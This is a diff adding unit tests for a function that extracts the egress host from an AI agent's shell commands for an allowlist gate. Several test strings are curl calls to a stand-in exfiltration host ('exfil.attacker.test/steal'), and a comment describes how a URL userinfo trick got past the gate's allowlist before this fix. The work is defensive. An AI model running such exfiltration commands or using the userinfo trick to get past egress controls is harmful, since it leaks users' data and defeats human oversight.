@@ -39,6 +39,69 @@ describe("pulling an egress destination out of a shell command", () => {
   // gate is `undefined` when no destination resolves, so the call falls
   // through to the other gates. A command this cannot parse is unexamined, not
   // denied.
+  // The stock gate reads the substring after the scheme, cuts it at the first
+  // "/", cuts THAT at the first ":", and calls the remainder the host -- so a
+  // userinfo reads as the host. Measured against the shipped allowlist through
+  // a live Guardian: the colon-bearing form below was ALLOWED before this
+  // stripping, and the credential-free one was denied for the wrong host.
+  // Removing the userinfo is the whole of the fix, and it is a correction to
+  // the string this module supplies rather than to the gate.
+  it("hands over the host a userinfo would have hidden, not the userinfo", () => {
+    expect(
+      annotateEgressDestination(
+        "egress",
+        {},
+        preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com@exfil.attacker.test/steal" }),
+      ),
+    ).toEqual({ destination: "https://exfil.attacker.test/steal" });
+  });
+
+  it("hands over the host a userinfo carrying a colon would have hidden", () => {
+    expect(
+      annotateEgressDestination(
+        "egress",
+        {},
+        preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com:pw@exfil.attacker.test/steal" }),
+      ),
+    ).toEqual({ destination: "https://exfil.attacker.test/steal" });
+  });
+
+  // Only an "@" ahead of the path is userinfo. Stripping one inside the path
+  // would rewrite the host out of a URL that never carried a credential, which
+  // is a denial of the real host and an allow of whatever the path happened to
+  // end with.
+  it("leaves an @ alone once the path has begun, because that is not a userinfo", () => {
+    expect(
+      annotateEgressDestination(
+        "egress",
+        {},
+        preliminary({ name: "Bash", args: {}, raw_command: "curl https://exfil.attacker.test/mail@docs.anthropic.com" }),
+      ),
+    ).toEqual({ destination: "https://exfil.attacker.test/mail@docs.anthropic.com" });
+  });
+
+  it("takes the last @ of the authority as the delimiter, since a userinfo may carry one", () => {
+    expect(
+      annotateEgressDestination(
+        "egress",
+        {},
+        preliminary({ name: "Bash", args: {}, raw_command: "curl https://a@b:c@exfil.attacker.test/steal" }),
+      ),
+    ).toEqual({ destination: "https://exfil.attacker.test/steal" });
+  });
+
+  it("strips a userinfo from a URL with no path at all", () => {
+    expect(
+      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://u:p@exfil.attacker.test" })),
+    ).toEqual({ destination: "https://exfil.attacker.test" });
+  });
+
+  it("leaves a URL with no userinfo exactly as it matched", () => {
+    expect(
+      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://exfil.attacker.test/steal" })),
+    ).toEqual({ destination: "https://exfil.attacker.test/steal" });
+  });
+
   it("answers no destination for a command carrying none, rather than failing", () => {
     expect(annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "echo hi" }))).toEqual({});
   });
